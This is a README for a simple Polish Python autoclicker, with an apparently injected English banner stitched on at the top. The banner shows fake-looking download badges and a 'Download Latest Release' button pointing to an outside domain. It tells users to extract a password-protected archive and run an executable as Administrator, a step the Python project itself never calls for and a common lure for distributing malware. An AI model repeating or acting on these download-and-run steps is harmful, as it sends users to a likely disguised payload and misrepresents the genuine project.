<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Simple Autoclicker - README.md

Bardzo prosty autoclicker, napisany w Pythonie, który wykorzystuje bibliotekę pynput (Windows) i evdev (Linux).

## Uwaga!

Autoclicker **nie posiada** GUI i jest **bardzo prosty w wykryciu** przez auto-cheaty czy inne.

**Nie ponoszę żadnej** odpowiedzialności za nieudane wykorzystanie tego programu w celach cheatowania, oszukiwania innych programów, gier, ... oraz skutków tego, jakimi są bany, timeouty ani żadne inne kary!

Pełna licencja w pliku `LICENSE.md`. (Licencja MIT)

**Projekt w Celach Edukacyjnych!**

## Funkcje

- Automatyczne klikanie lewym przyciskiem myszy
- Tryb stały (steady) - równe odstępy między kliknięciami
- Tryb zlosowaniem (fluctuating) - losowe odstępy z konfigurowalnym minimum
- Obsługa Linuxa (evdev) i Windowsa (pynput)
- Konfiguracja CPS, czasu trwania, losowości
- Obsługa trybu bez limitu czasu

## Wymagania

- Python >= 3.10
- Linux: `evdev`
- Windows: `pynput`
- `numpy` (dla trybu losowego)

## Instalacja

Używając `pip`:

```bash
pip install -r requirements.txt
```

Używając `uv`:

```bash
uv pip install -r requirements.txt
```

### W niektórych systemach, np. `Arch Linux`, trzeba utworzyć `Virtualny folder`.

Używając `python`:

```bash
python -m venv venv
```

Używając `uv`:

```bash
uv venv venv
```

## Uruchamianie

```bash
python .
```

```bash
python __main__.py
```

```bash
uv run .
```

### Używając `Virtualnego Folderu`, np. w systemie `Arch Linux`:

Używając `pip i python`:
```bash
source venv/bin/activate
python .
```

Bezpośrednio:

```bash
./venv/bin/python .
```

Używając `uv`:

```bash
source venv/bin/activate
uv run .
```

## Użycie

Po uruchomieniu program poprosi o:

1. **System** - automatycznie wykrywa Linux/Windows. Jeśli nieobsługiwany, pyta o ręczny wybór.
2. **Czas trwania** - w sekundach. Domyślnie: 2. Wartość 0 = bez limitu (Ctrl+C aby zatrzymać).
3. **CPS** - kliknięcia na sekundę. Domyślnie: 1.
4. **Losowy odstęp** - czy odstęp między kliknięciami ma być losowy. Domyślnie: Tak.
5. **Minimalny odstęp** - minimalny czas między kliknięciami (dla trybu losowego). Domyślnie: 0.1s.

Przed startem program wyświetli podsumowanie ustawień i zapyta o potwierdzenie.

## Testowanie

### Testy automatyczne

```bash
pip install -e ".[test]"
pytest tests/ -v
```

### Testy manualne

Otwórz `manual_test/index.html` w przeglądarce. Dostępne testy:

- **Kliknij!** - podstawowy test kliknięcia
- **Licznik kliknięć** - przyciski +/− z pomiarem CPS
- **Tester CPS** - pomiary w przedziałach 2-60s
- **Wykres kliknięć** - wizualizacja CPS w czasie rzeczywistym

## Deweloperzy

```bash
pip install -e ".[dev]"
```

Lintowanie:
```bash
ruff check .
```

Formatowanie:
```bash
ruff format .
```

## Kod

Kod startowy znajduje się w pliku `__main__.py`.
Natomiast kod dla specyficznej platformy znajduje się w plikach w folderze `click_platform`:
- `Linux.py` dla platform typu `Linux`.
- `Windows.py` dla platform typu `Windows`.


---

MIT License

Copyright (c) 2024 Bartosz Zakrzewski

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
